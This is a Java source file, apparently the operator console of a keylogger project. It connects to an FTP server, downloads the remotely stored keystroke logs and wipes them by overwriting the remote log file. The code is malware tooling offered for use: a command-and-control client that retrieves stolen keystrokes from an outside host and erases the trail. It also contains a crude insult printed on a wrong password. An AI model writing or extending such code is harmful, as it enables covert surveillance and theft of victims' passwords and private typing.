package org.dot;

import static org.dot.Constants.LOG_REMOTE;
import static org.dot.Constants.PASSWORD;
import static org.dot.KeyLogger.LINE;

import java.awt.Label;
import java.io.Console;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.Scanner;

public class Server {
	
	private ArrayList<String> commands = new ArrayList<>();
	
	private void init() throws Exception {
		System.out.println("Wait...");
		
		FTPManager.connect();
		
		commands.add("download");
		commands.add("clear");
		commands.add("exit");
		commands.add("quit");
		
		System.out.println("Ready to work.");
	}
	
	public Server() {
		try {
			Console cons = System.console();
			if (cons != null) {
				System.out.println("Enter the password: ");
				char[] pass = PASSWORD.toCharArray();
				char[] p;
				
				while (!String.valueOf((p = cons.readPassword())).equals(String.valueOf(pass))) {
					System.out.println("Wrong pass, go f*ck urself");
				}
			}
			init();
			
			Scanner scn = new Scanner(System.in);
			hmm:
			do {
				System.out.print("~ ");
				String[] commands = getCommands(scn.nextLine()); 
					switch (commands[0]) {
					case "download":
						if (commands.length < 2)
							download();
						else
							download(commands[1]);
						break;
					case "clear":
						clear();
						break;
					case "exit":
						break hmm;
					case "quit":
						break hmm;
					default:
						System.out.println("Unknown command.");
					}
			} while (true);
			
			scn.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	private String[] getCommands(String string) {
		ArrayList<String> res = new ArrayList<>();
		String[] ss = string.split(" ");
		for (int i = 0; i < ss.length; i++) {
			String s = ss[i];
			if (s.contains("\"") && i < ss.length - 1) do {
				s += " " + ss[++i];
			} while (i < ss.length && !ss[i].contains("\""));
			s = s.replace("\"", " ").trim();
			res.add(s);
		}
		String[] r = new String[res.size()];
		res.toArray(r);
		return r;
	}
	
	private void download() throws Exception {
		if (FTPManager.download())
			System.out.println("Completed.");
		else
			System.out.println("Failed.");
	}
	
	private void download(String path) throws Exception {
		if (FTPManager.download(path))
			System.out.println("Completed.");
		else
			System.out.println("Failed.");
	}
	
	private void clear() throws Exception {
		OutputStream out = FTPManager.ftp.storeFileStream(LOG_REMOTE);
		out.write("".getBytes());
		out.close();
		System.out.println("Logs cleared.");
	}
	
}
